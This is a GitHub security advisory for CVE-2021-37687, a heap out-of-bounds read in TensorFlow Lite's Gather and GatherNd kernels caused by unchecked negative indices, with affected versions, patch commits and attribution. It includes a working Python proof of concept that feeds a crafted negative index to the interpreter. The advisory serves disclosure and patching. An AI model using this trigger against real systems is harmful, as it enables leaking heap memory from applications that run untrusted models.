# [M] Heap OOB in TFLite's `Gather*` implementations

## Summary
Severity: Medium
Advisory: GHSA-jwf9-w5xm-f437
CVE: CVE-2021-37687
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-jwf9-w5xm-f437
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
TFLite's [`GatherNd` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124) does not support negative indices but there are no checks for this situation.

Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in `indices`.

Similar issue exists in [`Gather` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc).

```python
import tensorflow as tf
import numpy as np
tf.compat.v1.disable_v2_behavior()

params = tf.compat.v1.placeholder(name="params", dtype=tf.int64, shape=(1,))
indices = tf.compat.v1.placeholder(name="indices", dtype=tf.int64, shape=())

out = tf.gather(params, indices, name='out')

with tf.compat.v1.Session() as sess:
   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])
   tflite_model = converter.convert()

interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()

input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()

params_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))
indices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())
interpreter.set_tensor(input_details[0]['index'], params_data)
interpreter.set_tensor(input_details[1]['index'], indices_data)

interpreter.invoke()
```

### Patches
We have patched the issue in GitHub commits [bb6a0383ed553c286f87ca88c207f6774d5c4a8f](https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f) and [eb921122119a6b6e470ee98b89e65d721663179d](https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437
- https://nvd.nist.gov/vuln/detail/CVE-2021-37687
- https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f
- https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-600.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-798.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-309.yaml
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc
- https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124
